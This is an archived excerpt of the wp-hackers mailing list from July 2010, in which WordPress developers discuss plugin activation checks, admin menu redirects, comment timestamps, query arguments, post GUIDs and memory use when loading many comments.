	<AANLkTimYT-MiXsihi4GKDaJ2lELFGDi7ZG5zZyH6pHNo@mail.gmail.com>
	<000a01cb1f36$146799a0$3d36cce0$@org>
	<AANLkTinSND0tE2itCOpt5K7hyT1v-ZKdtHTk8f3NTQqe@mail.gmail.com>
	<000301cb1f47$2f2e3e90$8d8abbb0$@org>
Message-ID: <AANLkTikwsLBdIOnfIbrSGl6hiihryE_evu6VYOXoIMzw@mail.gmail.com>

here is what otto wrote
/**
 * plugin_activation_check()
 *
 * Replace "plugin" with the name of your plugin
 */
function plugin_activation_check(){
       if (version_compare(PHP_VERSION, '5.0.0', '<')) {
               deactivate_plugins(basename(__FILE__)); // Deactivate ourself
               wp_die("Sorry, but you can't run this plugin, it
requires PHP 5 or higher.");
       }
}
register_activation_hook(__FILE__, 'plugin_activation_check');



On 7/9/10, Raj <list at expost.org> wrote:
> Otto replied? I didn't get it. Will check in the hackers archive.
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Piyush Mishra
> Sent: Friday, July 09, 2010 1:12 PM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] How do I prevent activation of plugin is below
> PHP5?
>
> see otto's reply :)
> the other(not recomended) way is to remove ur plugin from active
> plugins list in options table
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Regards
Piyush Mishra
http://www.piyushmishra.com/
Life's Short, Live it to the maximum

From ssruprai at hotmail.com  Fri Jul  9 13:47:40 2010
From: ssruprai at hotmail.com (Sukhwinder Singh)
Date: Fri, 9 Jul 2010 19:17:40 +0530
Subject: [wp-hackers] Three Plugin development questions
Message-ID: <BAY119-W417474E4CD8872C2F03CF3C2B50@phx.gbl>


Hello,

I had posted this at wordpress.org forum but haven't received any reply since yesterday so I subscribed to this mailing list to try to get any help.


			I am developing a plugin and I have following 
code:



add_action('admin_menu','businesses_navigation');

function businesses_navigation()

{

	add_object_page("Firms Manager", "Firms", 8, 'firm_listing', 
"business_listings"); 

	add_submenu_page('firm_listing', 'Add Firm' , 'Add Firm', 8, 'firm, 
'add_firm' );

}

function business_listings()

{

	global $wpdb;

	include('firm_listing.php');

}

function add_firm()

{

	global $wpdb;

	include('firm.php');

}



Problems:


1. Main menu 'Firms' item also appears in submenu.



2. The submenu page 'Add Firm' is used to add/edit a firm. But when 
after adding a firm I try to redirect to 'firm listing' page I get the 
headers already sent error. "Warning: Cannot modify header information -
 headers already sent by (output started at 
<path>\wordpress3\wp-admin\admin-header.php:19)". JavaScript 
redirect is an option but I don't want to use it.



3. I want to change the page/title header dynamically when user is 
'editing' the firm rather than 'adding'. Right now it always shows 'Add 
Firm'.

Please let me know how I can achieve the above.



Thanks


		
 		 	   		  
_________________________________________________________________
The latest in fashion and style in MSN Lifestyle
http://lifestyle.in.msn.com/

From wp at andrewnacin.com  Fri Jul  9 13:58:29 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 9 Jul 2010 09:58:29 -0400
Subject: [wp-hackers] Three Plugin development questions
In-Reply-To: <BAY119-W417474E4CD8872C2F03CF3C2B50@phx.gbl>
References: <BAY119-W417474E4CD8872C2F03CF3C2B50@phx.gbl>
Message-ID: <AANLkTikjEXnh-ON3EkOhkqelpNoSn7B0ovVwrpB-qJiH@mail.gmail.com>

On Fri, Jul 9, 2010 at 9:47 AM, Sukhwinder Singh <ssruprai at hotmail.com>wrote:
>
> I had posted this at wordpress.org forum but haven't received any reply
> since yesterday so I subscribed to this mailing list to try to get any help.
>

This is not a support mailing list, but I will lead you on your way with
some general advice that can apply to numerous situations:

You are using user levels, i.e. 8. Please use capabilities, i.e. edit_posts
or manage_options: http://codex.wordpress.org/Roles_and_Capabilities. User
levels have been deprecated since the year 2005. Don't use them.

Turn on WP_DEBUG during development: define('WP_DEBUG', true); in
wp-config.php.

In your call to add_submenu_page(), one of the 'Add Firm' strings is the
page title.

With regards to headers already being sent, you are hooking in too late to
perform a redirection -- it must come before any HTTP headers are sent. You
should consider using a custom post type or the settings API in general
since most of the work has been done for you, but if you want to build your
own pages, please look through the Codex, the various tutorials that are out
there, and the hooks in the code (admin.php, admin-header.php, etc.).

From wp-hackers at nicolaskuttler.de  Fri Jul  9 14:16:28 2010
From: wp-hackers at nicolaskuttler.de (Nicolas Kuttler)
Date: Fri, 9 Jul 2010 16:16:28 +0200
Subject: [wp-hackers] Three Plugin development questions
In-Reply-To: <AANLkTikjEXnh-ON3EkOhkqelpNoSn7B0ovVwrpB-qJiH@mail.gmail.com>
References: <BAY119-W417474E4CD8872C2F03CF3C2B50@phx.gbl>
	<AANLkTikjEXnh-ON3EkOhkqelpNoSn7B0ovVwrpB-qJiH@mail.gmail.com>
Message-ID: <20100709141627.GD23954@nicolaskuttler.de>

On Fri, Jul 09, 2010 at 09:58:29AM -0400, Andrew Nacin wrote:
> This is not a support mailing list, but I will lead you on your way with
> some general advice that can apply to numerous situations:

Just to make sure that you haven't missed the relatively new custom post type feature:

http://codex.wordpress.org/Custom_Post_Types

Follow the links at the bottom for more documentation.

Nicolas

--
Nicolas Kuttler
wp at nkuttler.de

http://www.nkuttler.de
http://www.nicolaskuttler.de (deutsch)

From ssruprai at hotmail.com  Fri Jul  9 14:27:49 2010
From: ssruprai at hotmail.com (Sukhwinder Singh)
Date: Fri, 9 Jul 2010 19:57:49 +0530
Subject: [wp-hackers] Three Plugin development questions
In-Reply-To: <AANLkTikjEXnh-ON3EkOhkqelpNoSn7B0ovVwrpB-qJiH@mail.gmail.com>
References: <BAY119-W417474E4CD8872C2F03CF3C2B50@phx.gbl>,
	<AANLkTikjEXnh-ON3EkOhkqelpNoSn7B0ovVwrpB-qJiH@mail.gmail.com>
Message-ID: <BAY119-W588A03F5C4AD1B296F9A2C2B50@phx.gbl>


Sorry for posting at wrong mailing list. I know cannot expect any more support here but I still want to explain what I am doing. 

Regarding user capabilities I'lll look at those. I just started with wordpress plugin development and have only done few projects. So I looked at other plugins code etc. and user the methods I saw there.

> In your call to add_submenu_page(), one of the 'Add Firm' strings 
is the
> page title.

I understand this but thing is the same form will handle editing/adding so when an id is passed I wanted to dynamically change what appears in browser address bar to 'Update Firm'.


> With regards to headers already being sent, you are hooking in too 
late to
> perform a redirection -- it must come before any HTTP 
headers are sent. You
> should consider using a custom post type.

The headers are sent by wordpress admin.php file and I don't output anything myself before redirecting. 
I think when using add_menu_page or add_submenu_page whatever page/code redirects gets the header already sent warning. I am not sure if there is any other way to add menus or submenus so that I don't get headers warning.

Also there is a problem of menu item appearing twice (once in main menu and once in submenu)

Regarding custom posts we started with those but I think data for custom posts is stored in post_meta in row format rather than columns (I understand it has to be done this way). I want to extract data in different ways and pass on to some flash front end so I am not sure the custom posts may be best way.

I have searched around and have not found answers to these questions. Only as last resort I post to forum or subscribe to mailing list.
Could you please let me know what should mailing list I should subscribe
 to for help in plugin development?

Thanks


> From: wp at andrewnacin.com
> Date: Fri, 9 Jul 2010 09:58:29 -0400
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Three Plugin development questions
> 
> On Fri, Jul 9, 2010 at 9:47 AM, Sukhwinder Singh <ssruprai at hotmail.com>wrote:
> >
> > I had posted this at wordpress.org forum but haven't received any reply
> > since yesterday so I subscribed to this mailing list to try to get any help.
> >
> 
> This is not a support mailing list, but I will lead you on your way with
> some general advice that can apply to numerous situations:
> 
> You are using user levels, i.e. 8. Please use capabilities, i.e. edit_posts
> or manage_options: http://codex.wordpress.org/Roles_and_Capabilities. User
> levels have been deprecated since the year 2005. Don't use them.
> 
> Turn on WP_DEBUG during development: define('WP_DEBUG', true); in
> wp-config.php.
> 
> In your call to add_submenu_page(), one of the 'Add Firm' strings is the
> page title.
> 
> With regards to headers already being sent, you are hooking in too late to
> perform a redirection -- it must come before any HTTP headers are sent. You
> should consider using a custom post type or the settings API in general
> since most of the work has been done for you, but if you want to build your
> own pages, please look through the Codex, the various tutorials that are out
> there, and the hooks in the code (admin.php, admin-header.php, etc.).
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
 		 	   		  
_________________________________________________________________
See the news as it happens on MSN videos
http://video.in.msn.com/

From ssruprai at hotmail.com  Fri Jul  9 14:30:01 2010
From: ssruprai at hotmail.com (Sukhwinder Singh)
Date: Fri, 9 Jul 2010 20:00:01 +0530
Subject: [wp-hackers] Three Plugin development questions
In-Reply-To: <20100709141627.GD23954@nicolaskuttler.de>
References: <BAY119-W417474E4CD8872C2F03CF3C2B50@phx.gbl>,
	<AANLkTikjEXnh-ON3EkOhkqelpNoSn7B0ovVwrpB-qJiH@mail.gmail.com>,
	<20100709141627.GD23954@nicolaskuttler.de>
Message-ID: <BAY119-W33129A5AEBD7ED8B25803FC2B50@phx.gbl>


I didn't. Because of the way I want to query data I am not sure custom posts can help. I am already done with what I want to do and forms/listings are ready but those three problems still exist.



> Date: Fri, 9 Jul 2010 16:16:28 +0200
> From: wp-hackers at nicolaskuttler.de
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Three Plugin development questions
> 
> On Fri, Jul 09, 2010 at 09:58:29AM -0400, Andrew Nacin wrote:
> > This is not a support mailing list, but I will lead you on your way with
> > some general advice that can apply to numerous situations:
> 
> Just to make sure that you haven't missed the relatively new custom post type feature:
> 
> http://codex.wordpress.org/Custom_Post_Types
> 
> Follow the links at the bottom for more documentation.
> 
> Nicolas
> 
> --
> Nicolas Kuttler
> wp at nkuttler.de
> 
> http://www.nkuttler.de
> http://www.nicolaskuttler.de (deutsch)
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
 		 	   		  
_________________________________________________________________
See the news as it happens on MSN videos
http://video.in.msn.com/

From markjaquith at gmail.com  Fri Jul  9 15:31:29 2010
From: markjaquith at gmail.com (Mark Jaquith)
Date: Fri, 9 Jul 2010 11:31:29 -0400
Subject: [wp-hackers] wp_new_comment($commentdata) ignores timestamp?
In-Reply-To: <4A340A90-98D3-4B00-9833-96A8FC39A756@gmail.com>
References: <4A340A90-98D3-4B00-9833-96A8FC39A756@gmail.com>
Message-ID: <AANLkTinKE-ebyls8Z2CfQodIBT53PF7GTwqI4pvvUHq3@mail.gmail.com>

On Wed, Jul 7, 2010 at 1:57 PM, John Eckman <eckman.john at gmail.com> wrote:
> Is there a way to use wp_new_comment() but force it to accept a timestamp if one is passed in?

Not currently. wp_new_comment() sets comment_date and
comment_date_gmt, ignoring anything you've passed in. Open a Trac
ticket for that and then e-mail me privately and I'll look into it
when we start 3.1 development in September. I'm of the opinion that it
should work like several of the other fields do (set it to the current
time only if it isn't already set).

For now, I recommend that you use the comment_post hook to alter the
date after it has been inserted. Do a just-in-time
registration/unregistration of that hook, wrapped around your
wp_new_comment() call.

// Stick your FB-originated comment_date and comment_date_gmt values somewhere
add_action( 'comment_post', 'your_callback' );
wp_new_comment( $data );
remove_action( 'comment_post', 'your_callback' );

// [...]

function your_callback( $comment_id ) {
	// grab the desired date/date_gmt you saved earlier
	// update the comment using wp_update_comment()
	// no need to fetch the comment, wp_update_comment() will merge data,
so just pass in the date columns
}

-- 
Mark Jaquith
? http://markjaquith.com/
? http://coveredwebservices.com/

From banago at gmail.com  Fri Jul  9 18:18:26 2010
From: banago at gmail.com (Baki Goxhaj)
Date: Fri, 9 Jul 2010 20:18:26 +0200
Subject: [wp-hackers] showposts vs. posts_per_page
Message-ID: <AANLkTimQjJeVqVAopxZY3KfPho1lOJ4zOjoVYrDLMauz@mail.gmail.com>

Hi hackers,

I see very much posts_per_page argument used on loops that don't paginate by
purpose of creation in stead of showposts. Is there any fundamental
difference from the two? If yes, what is it and how much are those to
arguments interchangeable?

Thanks very much!

Baki Goxhaj
www.wplancer.com | www.banago.info | www.lintuts.com

From otto at ottodestruct.com  Fri Jul  9 18:26:24 2010
From: otto at ottodestruct.com (Otto)
Date: Fri, 9 Jul 2010 13:26:24 -0500
Subject: [wp-hackers] showposts vs. posts_per_page
In-Reply-To: <AANLkTimQjJeVqVAopxZY3KfPho1lOJ4zOjoVYrDLMauz@mail.gmail.com>
References: <AANLkTimQjJeVqVAopxZY3KfPho1lOJ4zOjoVYrDLMauz@mail.gmail.com>
Message-ID: <AANLkTinUdYLUc4SkQZpJjC0gevH-HaS2arTW2ElJbu0G@mail.gmail.com>

They're identical. showposts is the older argument name. It now gets
simply copied into posts_by_page.

You should always use posts_by_page for new code. The "showposts" name
is sorta deprecated.

-Otto



On Fri, Jul 9, 2010 at 1:18 PM, Baki Goxhaj <banago at gmail.com> wrote:
> Hi hackers,
>
> I see very much posts_per_page argument used on loops that don't paginate by
> purpose of creation in stead of showposts. Is there any fundamental
> difference from the two? If yes, what is it and how much are those to
> arguments interchangeable?
>
> Thanks very much!
>
> Baki Goxhaj
> www.wplancer.com | www.banago.info | www.lintuts.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From banago at gmail.com  Fri Jul  9 18:54:47 2010
From: banago at gmail.com (Baki Goxhaj)
Date: Fri, 9 Jul 2010 20:54:47 +0200
Subject: [wp-hackers] showposts vs. posts_per_page
In-Reply-To: <AANLkTinUdYLUc4SkQZpJjC0gevH-HaS2arTW2ElJbu0G@mail.gmail.com>
References: <AANLkTimQjJeVqVAopxZY3KfPho1lOJ4zOjoVYrDLMauz@mail.gmail.com>
	<AANLkTinUdYLUc4SkQZpJjC0gevH-HaS2arTW2ElJbu0G@mail.gmail.com>
Message-ID: <AANLkTilNGwRdS2tyovU4U8L2Kx-1siisoq3D8P6sPtJ9@mail.gmail.com>

Thansk Otto, very clear explanation.

PS: posts_per_page, not posts_by_page I guess :)

Baki Goxhaj
www.wplancer.com | www.banago.info | www.lintuts.com


On 9 July 2010 20:26, Otto <otto at ottodestruct.com> wrote:

> They're identical. showposts is the older argument name. It now gets
> simply copied into posts_by_page.
>
> You should always use posts_by_page for new code. The "showposts" name
> is sorta deprecated.
>
> -Otto
>
>
>
> On Fri, Jul 9, 2010 at 1:18 PM, Baki Goxhaj <banago at gmail.com> wrote:
> > Hi hackers,
> >
> > I see very much posts_per_page argument used on loops that don't paginate
> by
> > purpose of creation in stead of showposts. Is there any fundamental
> > difference from the two? If yes, what is it and how much are those to
> > arguments interchangeable?
> >
> > Thanks very much!
> >
> > Baki Goxhaj
> > www.wplancer.com | www.banago.info | www.lintuts.com
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From 24-7 at gmx.net  Fri Jul  9 19:05:51 2010
From: 24-7 at gmx.net (24/7)
Date: Fri, 9 Jul 2010 12:05:51 -0700 (PDT)
Subject: [wp-hackers] update $wp_query->post->guid fails
Message-ID: <668776ba-a385-41a4-813f-3d125ad3d698@t10g2000yqg.googlegroups.com>

Hi list members,

i imported test/example posts some time ago. Today i checked the
following:

[code]
global $wp_query;
$test_me = $wp_query->post->guid;
echo $test_me;
[/code]

The result was http://dev.*****.com/dan/wordpress/?p=53

I than took a look into $wpdb->table_prefix . '_posts' and found that
it was really stored there as the result told me. I tried saving the
post again, but the guid-column field stays the same.

Am i running into a bug? Thanks!

From otto at ottodestruct.com  Fri Jul  9 19:14:25 2010
From: otto at ottodestruct.com (Otto)
Date: Fri, 9 Jul 2010 14:14:25 -0500
Subject: [wp-hackers] update $wp_query->post->guid fails
In-Reply-To: <668776ba-a385-41a4-813f-3d125ad3d698@t10g2000yqg.googlegroups.com>
References: <668776ba-a385-41a4-813f-3d125ad3d698@t10g2000yqg.googlegroups.com>
Message-ID: <AANLkTikGcVdvSSQnly8BtgSTenIljOE8gXt4y6_ra3Pz@mail.gmail.com>

The GUID field never changes. It's not the current permalink of the
post, it's a unique identifier for that post. If you make the post
somewhere and then import the post to a new place, the GUID field will
remain the same.

Yes, it's set to be a link to the post at the time of creation, but
it's not a "link", really. It's a unique identifier.

-Otto



On Fri, Jul 9, 2010 at 2:05 PM, 24/7 <24-7 at gmx.net> wrote:
> Hi list members,
>
> i imported test/example posts some time ago. Today i checked the
> following:
>
> [code]
> global $wp_query;
> $test_me = $wp_query->post->guid;
> echo $test_me;
> [/code]
>
> The result was http://dev.*****.com/dan/wordpress/?p=53
>
> I than took a look into $wpdb->table_prefix . '_posts' and found that
> it was really stored there as the result told me. I tried saving the
> post again, but the guid-column field stays the same.
>
> Am i running into a bug? Thanks!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From johnbillion+wp at gmail.com  Fri Jul  9 19:22:08 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Fri, 9 Jul 2010 20:22:08 +0100
Subject: [wp-hackers] update $wp_query->post->guid fails
In-Reply-To: <AANLkTikGcVdvSSQnly8BtgSTenIljOE8gXt4y6_ra3Pz@mail.gmail.com>
References: <668776ba-a385-41a4-813f-3d125ad3d698@t10g2000yqg.googlegroups.com>
	<AANLkTikGcVdvSSQnly8BtgSTenIljOE8gXt4y6_ra3Pz@mail.gmail.com>
Message-ID: <AANLkTilpbCirPf31uFk6BA8asmOlLKd01xXPcKtBgo_P@mail.gmail.com>

Related: http://core.trac.wordpress.org/ticket/10857

On Fri, Jul 9, 2010 at 8:14 PM, Otto <otto at ottodestruct.com> wrote:
> The GUID field never changes. It's not the current permalink of the
> post, it's a unique identifier for that post. If you make the post
> somewhere and then import the post to a new place, the GUID field will
> remain the same.
>
> Yes, it's set to be a link to the post at the time of creation, but
> it's not a "link", really. It's a unique identifier.
>
> -Otto
>
>
>
> On Fri, Jul 9, 2010 at 2:05 PM, 24/7 <24-7 at gmx.net> wrote:
>> Hi list members,
>>
>> i imported test/example posts some time ago. Today i checked the
>> following:
>>
>> [code]
>> global $wp_query;
>> $test_me = $wp_query->post->guid;
>> echo $test_me;
>> [/code]
>>
>> The result was http://dev.*****.com/dan/wordpress/?p=53
>>
>> I than took a look into $wpdb->table_prefix . '_posts' and found that
>> it was really stored there as the result told me. I tried saving the
>> post again, but the guid-column field stays the same.
>>
>> Am i running into a bug? Thanks!
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From will at itsananderson.com  Fri Jul  9 19:23:54 2010
From: will at itsananderson.com (Will Anderson)
Date: Fri, 9 Jul 2010 12:23:54 -0700
Subject: [wp-hackers] update $wp_query->post->guid fails
In-Reply-To: <AANLkTikGcVdvSSQnly8BtgSTenIljOE8gXt4y6_ra3Pz@mail.gmail.com>
References: <668776ba-a385-41a4-813f-3d125ad3d698@t10g2000yqg.googlegroups.com>
	<AANLkTikGcVdvSSQnly8BtgSTenIljOE8gXt4y6_ra3Pz@mail.gmail.com>
Message-ID: <AANLkTilqxaRlQrOPYPWPRIcCFQi9Q_GJhDh2VROhdIgE@mail.gmail.com>

Is there a reason why the URL is used? From a GUID definition standpoint,
the post's address meets the criteria (it should be globally unique [1]),
but from a user's standpoint, it has a lot of potential for confusion for
people who are (a) new to the WP DB and (b) don't already know what a GUID
is.

I guess what it boils down to is, why isn't something like the PHP uniqid()
function [2] used instead?

[1] http://en.wikipedia.org/wiki/Globally_Unique_Identifier
<http://en.wikipedia.org/wiki/Globally_Unique_Identifier>[2]
http://www.php.net/manual/en/function.uniqid.php
<http://www.php.net/manual/en/function.uniqid.php>

On Fri, Jul 9, 2010 at 12:14 PM, Otto <otto at ottodestruct.com> wrote:

> The GUID field never changes. It's not the current permalink of the
> post, it's a unique identifier for that post. If you make the post
> somewhere and then import the post to a new place, the GUID field will
> remain the same.
>
> Yes, it's set to be a link to the post at the time of creation, but
> it's not a "link", really. It's a unique identifier.
>
> -Otto
>
>
>
> On Fri, Jul 9, 2010 at 2:05 PM, 24/7 <24-7 at gmx.net> wrote:
> > Hi list members,
> >
> > i imported test/example posts some time ago. Today i checked the
> > following:
> >
> > [code]
> > global $wp_query;
> > $test_me = $wp_query->post->guid;
> > echo $test_me;
> > [/code]
> >
> > The result was http://dev.*****.com/dan/wordpress/?p=53
> >
> > I than took a look into $wpdb->table_prefix . '_posts' and found that
> > it was really stored there as the result told me. I tried saving the
> > post again, but the guid-column field stays the same.
> >
> > Am i running into a bug? Thanks!
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Fri Jul  9 20:19:42 2010
From: otto at ottodestruct.com (Otto)
Date: Fri, 9 Jul 2010 15:19:42 -0500
Subject: [wp-hackers] update $wp_query->post->guid fails
In-Reply-To: <AANLkTilqxaRlQrOPYPWPRIcCFQi9Q_GJhDh2VROhdIgE@mail.gmail.com>
References: <668776ba-a385-41a4-813f-3d125ad3d698@t10g2000yqg.googlegroups.com>
	<AANLkTikGcVdvSSQnly8BtgSTenIljOE8gXt4y6_ra3Pz@mail.gmail.com> 
	<AANLkTilqxaRlQrOPYPWPRIcCFQi9Q_GJhDh2VROhdIgE@mail.gmail.com>
Message-ID: <AANLkTik2-dgIQtDkgVnS7PT7x0DCiEFblvEeeoM64QgH@mail.gmail.com>

On Fri, Jul 9, 2010 at 2:23 PM, Will Anderson <will at itsananderson.com> wrote:
> Is there a reason why the URL is used? From a GUID definition standpoint,
> the post's address meets the criteria (it should be globally unique [1]),
> but from a user's standpoint, it has a lot of potential for confusion for
> people who are (a) new to the WP DB and (b) don't already know what a GUID
> is.
>
> I guess what it boils down to is, why isn't something like the PHP uniqid()
> function [2] used instead?
>
> [1] http://en.wikipedia.org/wiki/Globally_Unique_Identifier
> <http://en.wikipedia.org/wiki/Globally_Unique_Identifier>[2]
> http://www.php.net/manual/en/function.uniqid.php
> <http://www.php.net/manual/en/function.uniqid.php>


In the world of RSS and ATOM feeds, historically, the URLs of the
content have been used as unique identifiers. Reasoning is that most
sites own their own domain and a URL tends to link to one thing only.
Same basic principle leads to the reversed domain pattern for
namespacing in object oriented languages like Java and such. The fact
that you have your own domain means that you can prevent collisions
and that the URL pattern is under your control.

I have argued for using real GUIDs before (using the mySQL UUID()
function[1]). There hasn't been any traction on it because nobody
seems to see any real advantages there. The GUID simply isn't used
much, although it's one of those necessary things for feeds.

The PHP uniqid function won't work because it's not *globally* unique.
The UUID() function in mySQL is.

-Otto

[1] http://dev.mysql.com/doc/refman/5.1/en/miscellaneous-functions.html#function_uuid

From william.canino at googlemail.com  Fri Jul  9 20:57:26 2010
From: william.canino at googlemail.com (William Canino)
Date: Fri, 9 Jul 2010 16:57:26 -0400
Subject: [wp-hackers] Memory spike in comments_template()
Message-ID: <AANLkTilicdyVVCxcJmMdxhQcnu8PBEXDnwTPBY2VO8m7@mail.gmail.com>

Hello,

One of my blog's most popular pages is hitting its shared host's
"memory limit", so this host is killing my scripts.  To diagnose it I
inserted several memory_get_usage calls in my theme.

This is how my single.php looks like:

<? remove_all_filters('comments_template'); ?>
<!-- BEFORE : <? echo memory_get_usage(); ?> -->	
<?php comments_template(); ?>
<!-- AFTER : <? echo memory_get_usage(); ?> -->	

This is how my comments.php looks like:

<!-- START: <? echo memory_get_usage(); ?> -->	
.... (everything else goes here) ...
<!-- END: <? echo memory_get_usage(); ?> -->	

This is my HTML output.

<!-- BEFORE: 25033360 -->	
<!-- START: 33953448 -->
... (comments go here) ...
<!-- END: 36172480 -->	
<!-- AFTER: 36113680 -->	

The memory usage jumped 8.5 megabytes between BEFORE and START.

Do I really have to move out some of the older comments of this blog
post?  Is there another solution?

(Sorry if this sounds too much like a support forum question.  The
wordpress.org forums are down.)

W

From otto at ottodestruct.com  Fri Jul  9 21:42:28 2010
From: otto at ottodestruct.com (Otto)
Date: Fri, 9 Jul 2010 16:42:28 -0500
Subject: [wp-hackers] Memory spike in comments_template()
In-Reply-To: <AANLkTilicdyVVCxcJmMdxhQcnu8PBEXDnwTPBY2VO8m7@mail.gmail.com>
References: <AANLkTilicdyVVCxcJmMdxhQcnu8PBEXDnwTPBY2VO8m7@mail.gmail.com>
Message-ID: <AANLkTilF37hio4zdo82JvGHxHHLI9ckAZJb97g7BrXAr@mail.gmail.com>

On Fri, Jul 9, 2010 at 3:57 PM, William Canino
<william.canino at googlemail.com> wrote:
> <!-- BEFORE: 25033360 -->
> <!-- START: 33953448 -->
> ... (comments go here) ...
> <!-- END: 36172480 -->
> <!-- AFTER: 36113680 -->
>
> The memory usage jumped 8.5 megabytes between BEFORE and START.
>
> Do I really have to move out some of the older comments of this blog
> post? ?Is there another solution?

Comments don't get pulled out of the database until the
comments_template function is called, so that basically means you've
got 8+ meg of comments on the post in question.


-Otto

From william.canino at googlemail.com  Fri Jul  9 22:39:51 2010
From: william.canino at googlemail.com (William Canino)
Date: Fri, 9 Jul 2010 18:39:51 -0400
Subject: [wp-hackers] Memory spike in comments_template()
In-Reply-To: <AANLkTilF37hio4zdo82JvGHxHHLI9ckAZJb97g7BrXAr@mail.gmail.com>
References: <AANLkTilicdyVVCxcJmMdxhQcnu8PBEXDnwTPBY2VO8m7@mail.gmail.com>
	<AANLkTilF37hio4zdo82JvGHxHHLI9ckAZJb97g7BrXAr@mail.gmail.com>
Message-ID: <AANLkTind79h-rV9sJb3bJnkO0CKjr0Cr8493F5Q_fdGt@mail.gmail.com>

(I should add that I have threading off.)

Denis-de-Bernardy has declared the issue as wont-fix :-(

https://core.trac.wordpress.org/ticket/8071

I will have to therefore write my own comments_template()....  Does
anyone have an alternative solution?

W


On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
> <william.canino at googlemail.com> wrote:
>> <!-- BEFORE: 25033360 -->
>> <!-- START: 33953448 -->
>> ... (comments go here) ...
>> <!-- END: 36172480 -->
>> <!-- AFTER: 36113680 -->
>>
>> The memory usage jumped 8.5 megabytes between BEFORE and START.
>>
>> Do I really have to move out some of the older comments of this blog
>> post? ?Is there another solution?
>
> Comments don't get pulled out of the database until the
> comments_template function is called, so that basically means you've
> got 8+ meg of comments on the post in question.
>
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Sat Jul 10 04:30:22 2010
From: william.canino at googlemail.com (William Canino)
Date: Sat, 10 Jul 2010 00:30:22 -0400
Subject: [wp-hackers] Memory spike in comments_template()
In-Reply-To: <AANLkTind79h-rV9sJb3bJnkO0CKjr0Cr8493F5Q_fdGt@mail.gmail.com>
References: <AANLkTilicdyVVCxcJmMdxhQcnu8PBEXDnwTPBY2VO8m7@mail.gmail.com>
	<AANLkTilF37hio4zdo82JvGHxHHLI9ckAZJb97g7BrXAr@mail.gmail.com>
	<AANLkTind79h-rV9sJb3bJnkO0CKjr0Cr8493F5Q_fdGt@mail.gmail.com>
Message-ID: <AANLkTim1jNrhP-DFK3ol4SM688UryGJTAWaEfdBleSrG@mail.gmail.com>

> I will have to therefore write my own comments_template()....

... Writing this turns out to be a complicated mod because the various
comment helper functions and callbacks presume that $comments has all
the comments. :-(

----> Well, this means while WordPress is not a blog anymore per se,
WordPress is NOT a discussion forum either, because WordPress doesn't
scale when it has a plethora of comments.

In the meantime, the palliative that lowered the memory usage by 3MB
is by commenting out "update_comment_cache($wp_query->comments);"





On 09/07/2010, William Canino <william.canino at googlemail.com> wrote:
> (I should add that I have threading off.)
>
> Denis-de-Bernardy has declared the issue as wont-fix :-(
>
> https://core.trac.wordpress.org/ticket/8071
>
> I will have to therefore write my own comments_template()....  Does
> anyone have an alternative solution?
>
> W
>
>
> On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
>> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
>> <william.canino at googlemail.com> wrote:
>>> <!-- BEFORE: 25033360 -->
>>> <!-- START: 33953448 -->
>>> ... (comments go here) ...
>>> <!-- END: 36172480 -->
>>> <!-- AFTER: 36113680 -->
>>>
>>> The memory usage jumped 8.5 megabytes between BEFORE and START.
>>>
>>> Do I really have to move out some of the older comments of this blog
>>> post?  Is there another solution?
>>
>> Comments don't get pulled out of the database until the
>> comments_template function is called, so that basically means you've
>> got 8+ meg of comments on the post in question.
>>
>>
>> -Otto
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>


On 09/07/2010, William Canino <william.canino at googlemail.com> wrote:
> (I should add that I have threading off.)
>
> Denis-de-Bernardy has declared the issue as wont-fix :-(
>
> https://core.trac.wordpress.org/ticket/8071
>
> I will have to therefore write my own comments_template()....  Does
> anyone have an alternative solution?
>
> W
>
>
> On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
>> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
>> <william.canino at googlemail.com> wrote:
>>> <!-- BEFORE: 25033360 -->
>>> <!-- START: 33953448 -->
>>> ... (comments go here) ...
>>> <!-- END: 36172480 -->
>>> <!-- AFTER: 36113680 -->
>>>
>>> The memory usage jumped 8.5 megabytes between BEFORE and START.
>>>
>>> Do I really have to move out some of the older comments of this blog
